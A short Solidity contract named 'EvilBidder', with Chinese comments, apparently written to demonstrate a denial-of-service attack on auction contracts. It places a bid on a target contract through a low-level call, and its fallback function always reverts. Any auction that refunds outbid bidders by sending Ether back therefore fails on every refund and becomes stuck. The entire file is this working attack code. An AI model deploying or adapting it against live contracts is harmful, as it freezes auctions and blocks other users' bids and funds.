pragma solidity ^0.4.11;
contract EvilBidder {
	/// Fallback函數
	function() payable{
		revert();
	}
	/// bid用函數
	function bid(address _to) public payable {
		// 進行bid
		if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
			throw;
		}
	}
}
